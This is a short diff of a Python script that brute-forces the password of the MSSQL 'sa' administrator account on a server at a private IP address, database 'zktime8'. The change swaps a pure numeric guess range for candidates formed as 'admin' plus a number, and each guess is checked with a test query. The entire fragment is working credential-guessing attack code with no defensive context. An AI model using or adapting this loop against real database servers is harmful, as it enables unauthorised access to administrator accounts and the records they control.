@@ -103,8 +103,8 @@ def pd():
 
 
 def main():
-    for i in range(88888, 9999999999):
-        password = str(i)
+    for i in range(500000, 999999):
+        password = 'admin'+str(i)
         try:
             ms = MSSQL(host="192.168.2.228", user="sa", pwd=password, db="zktime8")
             query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
